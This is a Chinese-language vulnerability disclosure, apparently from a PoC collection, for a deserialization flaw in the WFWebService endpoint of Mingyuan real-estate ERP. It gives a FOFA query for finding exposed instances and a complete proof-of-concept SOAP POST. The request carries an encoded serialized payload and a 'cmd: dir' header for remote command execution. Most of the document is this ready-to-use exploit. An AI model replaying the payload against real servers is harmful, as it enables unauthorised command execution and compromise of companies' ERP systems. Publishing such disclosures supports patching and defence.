# 明源地产ERP系统WFWebService存在反序列化漏洞
明源地产ERP是一款专为房地产行业设计的企业资源规划(ERP) 系统，系统集成了项目管理、财务管理、客户关系管理、营销管理等个模块，旨在帮助房地产企业提升运营效率、降低成本和提高客户满意度。它充分考虑了房地产行业的特性和需求，通过整合企业的各业务环节，实现信息的统一管理和高效协同。明源地产ERP WFWebService存在反序列化漏洞。

# fofa
```javascript
title="明源地产ERP"
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1730709603041-118d9f58-24d3-4e87-9fcc-4374ef9bc861.png)

## poc
```javascript
POST /MyWorkflowManagement/WebService/WFWebService.asmx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/WriteLog"
cmd: dir
 
<?xml version="1.0" encoding="utf-8"?>
  <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
      <WriteLog xmlns="http://tempuri.org/">
        <request>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</request>
      </WriteLog>
    </soap:Body>
  </soap:Envelope>
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1730710180719-f090ceb3-d687-4338-bc76-7417d07f5358.png)

